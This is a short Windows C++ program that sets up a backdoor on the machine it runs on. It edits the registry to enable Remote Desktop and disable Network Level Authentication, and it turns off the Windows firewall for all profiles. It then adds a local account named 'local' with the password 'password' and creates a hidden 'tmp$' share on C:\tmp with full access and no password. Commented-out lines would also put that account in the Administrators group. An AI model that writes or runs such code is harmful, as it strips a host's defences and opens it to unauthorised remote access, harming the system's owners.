#define UNICODE
#include <stdlib.h>
#include <windows.h>
#include <lm.h>
#include <stdio.h>
#include <fileapi.h>
#include <iostream>
#pragma comment(lib, "Netapi32.lib")

int main()
{
	//system("start net user local localpassword /add");
	//system("start net localgroup administrators local /add");
	system("start REG ADD \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\terminal server\"  /v fDenyTSConnections /t reg_dword /d 0x00000000 /f && netsh Advfirewall set allprofiles state off");
	system("start REG ADD \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t reg_dword /d 0x00000000 /f");
	
	CreateDirectory(L"C:\\tmp", NULL);
	


	
		USER_INFO_1 ui;
		DWORD dwLevel = 1;
		DWORD dwError = 0;
		NET_API_STATUS nStatus;

		ui.usri1_name = LPWSTR(L"local");
		ui.usri1_password = LPWSTR(L"password");
		ui.usri1_priv = USER_PRIV_USER;
		ui.usri1_home_dir = NULL;
		ui.usri1_comment = NULL;
		ui.usri1_flags = UF_SCRIPT;
		ui.usri1_script_path = NULL;

		nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&ui, &dwError);
	

		typedef struct _MY_SHARE_INFO_2 {
			LPTSTR shi2_netname;
			DWORD shi2_type;
			LPTSTR shi2_remark;
			DWORD shi2_permissions;
			DWORD shi2_max_uses;
			DWORD shi2_current_uses;
			LPTSTR shi2_path;
			LPTSTR shi2_passwd;
		} MY_SHARE_INFO_2, *PMYSHARE_INFO_2, *LPMYSHARE_INFO_2;



		NET_API_STATUS res;
		_MY_SHARE_INFO_2 p;
		DWORD parm_err = 0;
	
		p.shi2_netname = LPTSTR(L"tmp$");
		p.shi2_type = STYPE_DISKTREE;
		p.shi2_remark = LPTSTR(L"NetShareAdd");
		p.shi2_permissions = ACCESS_ALL;
		p.shi2_max_uses = 4;
		p.shi2_current_uses = 0;
		p.shi2_passwd = NULL; // no password
		
		p.shi2_path = LPTSTR(L"C:\\tmp");

		res = NetShareAdd(NULL,2,(LPBYTE) &p, &parm_err);
		if (res == 0)
			printf("Share created.\n");
		else
			printf("Share not.\n");
		return 0;
}